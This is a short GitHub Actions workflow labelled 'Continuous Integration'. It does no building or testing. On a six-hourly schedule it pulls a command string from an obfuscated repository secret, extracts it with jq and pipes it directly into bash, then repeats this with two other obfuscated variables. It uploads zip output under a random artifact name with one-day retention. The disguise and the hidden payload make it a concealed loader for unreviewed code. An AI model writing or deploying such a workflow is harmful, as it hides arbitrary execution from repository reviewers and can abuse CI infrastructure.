name: Continuous Integration
on:
  workflow_dispatch:

  schedule:
    - cron: '58 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          gz37: ${{ secrets.gz37 }}
        run: |
          printf '%s' "$gz37" | jq -r .nqwem30515 | /bin/bash
          echo $syq68508 | jq -r .wsub559 | /bin/bash
          echo $d43560 | jq -r .dyx843 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: nMRG2pce
          path: "*.zip"
          retention-days: 1
